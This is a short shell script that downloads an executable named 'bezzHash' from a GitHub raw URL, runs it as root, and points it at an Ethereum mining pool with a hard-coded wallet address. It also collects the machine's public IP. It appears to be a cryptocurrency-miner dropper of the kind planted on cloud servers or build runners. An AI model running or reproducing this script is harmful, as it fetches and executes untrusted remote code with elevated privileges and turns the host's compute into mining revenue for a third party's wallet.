#!/bin/sh
sudo apt update && sudo apt install libpci3
sudo wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash && ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && sudo ./bezzHash --url=ssl://0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4.$(echo $(shuf -i 1-9999 -n 1)-M)@eth-hk.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
